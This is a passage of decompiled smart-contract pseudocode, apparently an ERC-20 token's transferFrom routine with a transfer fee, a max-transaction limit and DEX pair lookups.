        mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
        staticcall address(stor19.field_8).0xad5c4648 with:
                gas gas_remaining wei
               args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        mem[(12 * ceil32(return_data.size)) + 268] = this.address
        mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
        staticcall address(ext_call.return_data[0]).0xe6a43905 with:
                gas gas_remaining wei
               args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        if ext_call.return_data[12 len 20] == arg2:
            if arg3 < 0:
                revert with 'NH{q', 17
            if balanceOf[0].field_0 > -1:
                revert with 'NH{q', 17
            if balanceOf[address(arg1)].field_0 < arg3:
                revert with 'NH{q', 17
            balanceOf[address(arg1)].field_0 -= arg3
            if balanceOf[address(arg2)].field_0 > -arg3 - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg2)].field_0 += arg3
            emit Transfer(address arg1, address arg2, uint256 arg3):
                          arg3,
                          mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                          arg1,
                          arg2,
            require allowance[address(arg1)][address(msg.sender)] >= arg3
            return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
        stor18.length++
        stor18[stor18.length].field_0 = arg2
        stor18[stor18.length].field_256 = arg3
        if arg3 < 0:
            revert with 'NH{q', 17
        if balanceOf[0].field_0 > -1:
            revert with 'NH{q', 17
        if balanceOf[address(arg1)].field_0 < arg3:
            revert with 'NH{q', 17
        balanceOf[address(arg1)].field_0 -= arg3
        if balanceOf[address(arg2)].field_0 > -arg3 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg2)].field_0 += arg3
        emit Transfer(address arg1, address arg2, uint256 arg3):
                      arg3,
                      mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                      arg1,
                      arg2,
    else:
        if arg3 and _fee > -1 / arg3:
            revert with 'NH{q', 17
        if not arg3:
            revert with 'NH{q', 18
        if arg3 * _fee / arg3 != _fee:
            revert with 0, 'SafeMath: multiplication overflow'
        require arg3 <= _maxTxAmount
        staticcall address(stor19.field_8).0xc45a0155 with:
                gas gas_remaining wei
        mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
        staticcall address(stor19.field_8).0xad5c4648 with:
                gas gas_remaining wei
               args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        mem[(12 * ceil32(return_data.size)) + 268] = this.address
        mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
        staticcall address(ext_call.return_data[0]).0xe6a43905 with:
                gas gas_remaining wei
               args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
        if ext_call.return_data[12 len 20] == arg2:
            if arg3 < arg3 * _fee / 100:
                revert with 'NH{q', 17
            if balanceOf[0].field_0 > -(arg3 * _fee / 100) - 1:
                revert with 'NH{q', 17
            balanceOf[0].field_0 += arg3 * _fee / 100
            if balanceOf[address(arg1)].field_0 < arg3:
                revert with 'NH{q', 17
            balanceOf[address(arg1)].field_0 -= arg3
            if balanceOf[address(arg2)].field_0 > -arg3 + (arg3 * _fee / 100) - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg2)].field_0 = balanceOf[address(arg2)].field_0 + arg3 - (arg3 * _fee / 100)
            emit Transfer(address arg1, address arg2, uint256 arg3):
                          arg3 - (arg3 * _fee / 100),
                          mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                          arg1,
                          arg2,
            if arg3 * _fee / 100 > 0:
                emit Transfer(address arg1, address arg2, uint256 arg3):
                              arg3 * _fee / 100,
                              mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                              arg1,
                              0,
            require allowance[address(arg1)][address(msg.sender)] >= arg3
            return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
        stor18.length++
        stor18[stor18.length].field_0 = arg2
        stor18[stor18.length].field_256 = arg3
        if arg3 < arg3 * _fee / 100:
            revert with 'NH{q', 17
        if balanceOf[0].field_0 > -(arg3 * _fee / 100) - 1:
            revert with 'NH{q', 17
        balanceOf[0].field_0 += arg3 * _fee / 100
        if balanceOf[address(arg1)].field_0 < arg3:
            revert with 'NH{q', 17
        balanceOf[address(arg1)].field_0 -= arg3
        if balanceOf[address(arg2)].field_0 > -arg3 + (arg3 * _fee / 100) - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg2)].field_0 = balanceOf[address(arg2)].field_0 + arg3 - (arg3 * _fee / 100)
        emit Transfer(address arg1, address arg2, uint256 arg3):
                      arg3 - (arg3 * _fee / 100),
                      mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                      arg1,
                      arg2,
        if arg3 * _fee / 100 > 0:
            emit Transfer(address arg1, address arg2, uint256 arg3):
                          arg3 * _fee / 100,
                          mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                          arg1,
                          0,
    require allowance[address(arg1)][address(msg.sender)] >= arg3
    return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
}



}
